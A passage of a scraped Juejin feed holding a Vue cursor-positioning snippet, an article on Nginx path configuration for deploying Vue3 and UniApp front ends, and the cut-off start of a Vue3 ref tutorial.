  <span class="hljs-keyword">await</span> <span class="hljs-title function_">nextTick</span>();
  <span class="hljs-comment">// 获取光标位置</span>
  <span class="hljs-keyword">const</span> container = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'.mention-wrapper'</span>);
  <span class="hljs-keyword">if</span> (container) {
    <span class="hljs-keyword">const</span> position = <span class="hljs-title function_">getCursorPositionInDiv</span>(container);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(position, <span class="hljs-string">'position==='</span>);
    <span class="hljs-keyword">if</span> (position) {
      <span class="hljs-comment">// 初始定位</span>
      <span class="hljs-keyword">const</span> desiredTop = position.<span class="hljs-property">top</span> + <span class="hljs-number">12</span>;
      <span class="hljs-keyword">const</span> desiredLeft = position.<span class="hljs-property">left</span> + <span class="hljs-number">5</span>;

      <span class="hljs-comment">// 再次等待以确保modal尺寸可测量</span>
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">nextTick</span>();
      <span class="hljs-keyword">const</span> correctedLeft = <span class="hljs-title function_">clampLeftWithinContainer</span>(container, desiredLeft);
      top.<span class="hljs-property">value</span> = <span class="hljs-string">`<span class="hljs-subst">${desiredTop}</span>px`</span>;
      left.<span class="hljs-property">value</span> = <span class="hljs-string">`<span class="hljs-subst">${correctedLeft}</span>px`</span>;
    }
  }

  <span class="hljs-comment">// focus input</span>
  <span class="hljs-keyword">if</span> (selectRef.<span class="hljs-property">value</span>) {
    selectRef.<span class="hljs-property">value</span>?.<span class="hljs-title function_">focus</span>();
  }
});
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue 项目 Nginx 部署路径差异分析与部署指南]]></title>    <link>https://juejin.cn/post/7574724406305751090</link>    <guid>https://juejin.cn/post/7574724406305751090</guid>    <pubDate>2025-11-21T03:43:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574724406305751090" data-draft-id="7574718964044955698" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue 项目 Nginx 部署路径差异分析与部署指南"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-21T03:43:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="东土也"/> <meta itemprop="url" content="https://juejin.cn/user/501033031183645"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue 项目 Nginx 部署路径差异分析与部署指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/501033031183645/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    东土也
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T03:43:46.000Z" title="Fri Nov 21 2025 03:43:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">差异产生的原因</h2>
<h3 data-id="heading-1">1. 构建工具差异</h3>
<ul>
<li><strong>若依 Vue3 项目</strong>：使用 <a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target=">Vite</a> 构建，配置了 <code>base: '/admin/'</code> 路径前缀</li>
<li><strong>UniApp 项目</strong>：默认使用相对路径引用静态资源</li>
</ul>
<h3 data-id="heading-2">2. 资源引用方式不同</h3>
<h4 data-id="heading-3">若依 Vue3 项目</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 构建时会在所有资源路径前添加 /admin/ 前缀</span>
<span class="hljs-comment">// 例如：/admin/static/js/index-xxxx.js</span>
</code></pre>
<h4 data-id="heading-4">UniApp 项目</h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 使用相对路径引用资源 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"./assets/uni.xxxx.css"</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"./static/js/app.xxxx.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-5">3. Nginx 路径匹配机制</h3>
<p>当使用不同配置时，路径解析结果不同：</p>























<table><thead><tr><th>配置方式</th><th>请求路径</th><th>实际查找路径</th><th>结果</th></tr></thead><tbody><tr><td><code>location /app/ { root /path; }</code></td><td><code>/assets/style.css</code></td><td><code>/path/assets/style.css</code></td><td>❌ 404</td></tr><tr><td><code>location / { root /path/app; }</code></td><td><code>/assets/style.css</code></td><td><code>/path/app/assets/style.css</code></td><td>✅ 成功</td></tr></tbody></table>
<h2 data-id="heading-6">两种方式对比</h2>
<h3 data-id="heading-7">方式一：子路径部署 (<code>/app/</code>)</h3>
<pre><code class="hljs language-nginx" lang="nginx">location /app/ {
    root /var/www/html/black_money;
    try_files $uri $uri/ /app/index.html;
}
</code></pre>
<p><strong>优点</strong>：</p>
<ul>
<li>URL 结构清晰，便于多项目管理</li>
<li>符合 RESTful 设计理念</li>
</ul>
<p><strong>缺点</strong>：</p>
<ul>
<li>需要确保前端项目构建时正确配置公共资源路径</li>
<li>需要额外的 Nginx 配置处理静态资源</li>
</ul>
<h3 data-id="heading-8">方式二：根路径部署 (<a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target=">/</a>)</h3>
<pre><code class="hljs language-nginx" lang="nginx">location / {
    root /var/www/html/black_money/app;
    try_files $uri $uri/ /index.html;
}
</code></pre>
<p><strong>优点</strong>：</p>
<ul>
<li>配置简单，兼容性好</li>
<li>适合单项目部署场景</li>
</ul>
<p><strong>缺点</strong>：</p>
<ul>
<li>多个项目时会有路径冲突</li>
<li>URL 结构不够清晰</li>
</ul>
<h2 data-id="heading-9">部署建议</h2>
<h3 data-id="heading-10">推荐方案：统一使用子路径部署</h3>
<h4 data-id="heading-11">1. 修改 UniApp 构建配置</h4>
<p>在 <code>manifest.json</code> 或构建配置中设置：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">publicPath</span>: <span class="hljs-string">"/app/"</span>;
<span class="hljs-comment">// 或</span>
<span class="hljs-attr">baseUrl</span>: <span class="hljs-string">"/app/"</span>;
</code></pre>
<h4 data-id="heading-12">2. 统一的 Nginx 配置</h4>
<pre><code class="hljs language-nginx" lang="nginx">server {
    listen 80;
    server_name example.com;

    # 若依管理系统
    location /admin/ {
        root /var/www/html/black_money;
        try_files $uri $uri/ /admin/index.html;
    }

    # UniApp应用
    location /app/ {
        root /var/www/html/black_money;
        try_files $uri $uri/ /app/index.html;
    }

    # 静态资源统一处理
    location ~ ^/(admin|app)/.*\.(js|css|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot)$ {
        root /var/www/html/black_money;
        expires 1y;
        add_header Cache-Control "public, immutable";
        try_files $uri =404;
    }
}
</code></pre>
<h2 data-id="heading-13">故障排查步骤</h2>
<ol>
<li><strong>检查构建配置</strong>：确认前端项目是否正确设置了公共资源路径</li>
<li><strong>验证文件结构</strong>：检查部署目录中的文件组织是否正确</li>
<li><strong>查看网络请求</strong>：使用浏览器开发者工具检查资源请求路径</li>
<li><strong>检查 Nginx 日志</strong>：查看 access.log 和 error.log 定位具体错误</li>
</ol>
<h2 data-id="heading-14">最佳实践</h2>
<ol>
<li><strong>统一规范</strong>：团队内统一前端项目的部署路径规范</li>
<li><strong>自动化部署</strong>：使用 CI/CD 工具自动处理构建和部署</li>
<li><strong>环境隔离</strong>：不同环境使用不同的配置文件</li>
<li><strong>文档记录</strong>：详细记录每个项目的部署要求和特殊配置</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue3 响应式原理：手写实现 ref 函数]]></title>    <link>https://juejin.cn/post/7574739133946265642</link>    <guid>https://juejin.cn/post/7574739133946265642</guid>    <pubDate>2025-11-21T03:59:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574739133946265642" data-draft-id="7574690878537383942" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue3 响应式原理：手写实现 ref 函数"/> <meta itemprop="keywords" content="前端,Vue.js"/> <meta itemprop="datePublished" content="2025-11-21T03:59:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="云枫晖"/> <meta itemprop="url" content="https://juejin.cn/user/835284567331021"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue3 响应式原理：手写实现 ref 函数
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/835284567331021/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    云枫晖
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T03:59:59.000Z" title="Fri Nov 21 2025 03:59:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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